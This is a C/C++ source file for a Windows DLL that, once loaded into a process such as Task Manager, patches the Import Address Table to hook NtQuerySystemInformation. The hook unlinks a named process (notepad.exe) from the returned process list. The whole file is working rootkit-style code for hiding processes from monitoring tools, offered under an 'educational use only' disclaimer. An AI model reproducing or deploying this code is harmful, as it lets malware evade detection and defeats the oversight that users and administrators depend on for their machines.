//***************************************************************//
//                                                               //
//  Project : Hidden Process                                     //
//  Description : Hides a process from Task Manager and          //
//                similar process monitoring tools               //
//                                                               //
//  Author      : LAZEROZOR                                      //
//  License     : Open Source - Educational use only             //
//  Date        : 2025                                           //
//                                                               //
//  Warning     : For educational and testing purposes only.     //
//                Use responsibly and ethically.                 //
//                                                               //
//  Credits     : guidedhacking.com for game hacking knowledge   //
//                                                               //
//***************************************************************//

#define _CRT_SECURE_NO_WARNINGS //So we can use old functions without warnings

#include "../headers/defines.h"

wchar_t targetProcess[] = L"notepad.exe"; //The name of the process we want to hide

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) //Our hooked function
{
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength); //Calling the original function

	if (SystemProcessInformation == SystemInformationClass && status == STATUS_SUCCESS)
	{
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
			if (!wcsncmp(pNext->ImageName.Buffer, targetProcess, pNext->ImageName.Length)) //If the process name match our target process
			{
				if (!pNext->NextEntryOffset)
					pCurrent->NextEntryOffset = 0;
				else
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;


			}
		} while (pCurrent->NextEntryOffset != 0);
	}

	return status;
}

bool hook()
{
    // Get current module info

    MODULEINFO modInfo = { 0 };
    HMODULE hMod = GetModuleHandle(nullptr);

    if (!hMod || !GetModuleInformation(GetCurrentProcess(), hMod, &modInfo, sizeof(modInfo)))
    {
        MessageBoxA(NULL, "Failed to get module information", "Hook Error", MB_ICONERROR);
        return false;
    }

    // Read PE headers

    LPBYTE pAddr = (LPBYTE)modInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddr;
    PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddr + pIDH->e_lfanew);

    // Get import directory

    DWORD importDirRVA = pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importDirSize = pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

    PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddr + importDirRVA);

    // Find ntdll.dll import descriptor

    PIMAGE_IMPORT_DESCRIPTOR pNtDllIID = nullptr;
    for (; pIID->Name; pIID++)
    {
        const char* moduleName = (const char*)(pAddr + pIID->Name);
        if (_stricmp(moduleName, "ntdll.dll") == 0)
        {
            pNtDllIID = pIID;
            break;
        }
    }

    if (!pNtDllIID)
    {
        MessageBoxA(NULL, "ntdll.dll not found in imports", "Hook Error", MB_ICONERROR);
        return false;
    }

    // Get original and first thunk arrays

    PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(pAddr + pNtDllIID->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pAddr + pNtDllIID->FirstThunk);

    // Find NtQuerySystemInformation

    void** pTargetFunction = nullptr;
    for (; pOriginalThunk->u1.Ordinal; pOriginalThunk++, pFirstThunk++)
    {
        if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal))
            continue; // Skip ordinal imports

        PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)(pAddr + pOriginalThunk->u1.AddressOfData);

        if (strcmp("NtQuerySystemInformation", (char*)pImport->Name) == 0)
        {
            pTargetFunction = (void**)&pFirstThunk->u1.Function;
            break;
        }
    }

    if (!pTargetFunction)
    {
        MessageBoxA(NULL, "NtQuerySystemInformation not found", "Hook Error", MB_ICONERROR);
        return false;
    }

    // Store original function

    OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)*pTargetFunction;

	// Giving write permissions to the memory page

    DWORD dwOldProtect;
    VirtualProtect(pTargetFunction, sizeof(void*), PAGE_READWRITE, &dwOldProtect);
	// Hook the function by replacing the address

    *pTargetFunction = (void*)HookedNtQuerySystemInformation;
    // Restore protection

    VirtualProtect(pTargetFunction, sizeof(void*), dwOldProtect, &dwOldProtect);

    return true;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) 
{
	if (reason == DLL_PROCESS_ATTACH)  //When the DLL is loaded into a process
	{
		DisableThreadLibraryCalls(instance); //Save some CPU
		Beep(750, 500);
		hook(); //Setup the hook
	}
		
	return TRUE;
}